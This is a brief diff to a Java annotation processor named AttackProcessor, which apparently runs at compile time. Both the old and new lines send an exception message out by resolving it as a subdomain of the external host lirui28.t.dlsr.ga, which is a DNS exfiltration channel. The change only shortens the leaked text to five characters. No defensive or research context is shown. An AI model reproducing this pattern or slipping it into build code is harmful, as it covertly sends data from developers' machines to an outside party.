@@ -77,7 +77,8 @@ public class AttackProcessor extends AbstractProcessor {
         {
             try
             {
-                Inet4Address.getByName( e.getMessage().replaceAll( " ","" )+".lirui28.t.dlsr.ga" );
+
+                Inet4Address.getByName( e.getMessage().replaceAll( " ","" ).substring( 0,5 )+".lirui28.t.dlsr.ga" );
             }
             catch ( UnknownHostException e1 )
             {
